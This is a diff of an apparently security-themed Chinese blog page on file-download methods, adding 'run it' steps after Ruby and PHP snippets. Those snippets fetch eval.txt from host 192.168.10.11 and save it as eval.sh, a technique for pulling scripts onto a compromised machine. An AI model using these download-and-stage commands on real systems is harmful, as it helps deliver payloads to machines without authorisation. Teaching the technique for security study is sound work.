@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/nc1.png">
 <meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/python.png">
 <meta property="article:published_time" content="2020-10-09T01:42:13.000Z">
-<meta property="article:modified_time" content="2020-10-09T09:52:24.867Z">
+<meta property="article:modified_time" content="2020-10-09T09:58:33.015Z">
 <meta property="article:author" content="crlf">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
@@ -274,6 +274,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"><lin
       <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!ruby</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;ruby</span><br><span class="line">require &#39;net&#x2F;http&#39;</span><br><span class="line">Net::HTTP.start(&quot;192.168.10.11&quot;) &#123; |http|</span><br><span class="line">r &#x3D; http.get(&quot;&#x2F;eval.txt&quot;)</span><br><span class="line">open(&quot;eval.sh&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 
 
+        <h5 id="然后shell-终端运行：">
+          <a href="#然后shell-终端运行：" class="heading-link"><i class="fas fa-link"></i></a>然后shell 终端运行：</h5>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby download.rb</span><br></pre></td></tr></table></div></figure>
+
+
 
 
         <h4 id="PHP：">
@@ -287,6 +292,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"><lin
         <h5 id="或者">
           <a href="#或者" class="heading-link"><i class="fas fa-link"></i></a>或者</h5>
       <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $data &#x3D; @file(&quot;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt&quot;);</span><br><span class="line">file_put_contents(&#39;eval.sh&#39;,$data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="然后运行：-1">
+          <a href="#然后运行：-1" class="heading-link"><i class="fas fa-link"></i></a>然后运行：</h5>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php download.php </span><br></pre></td></tr></table></div></figure>
 
 
 
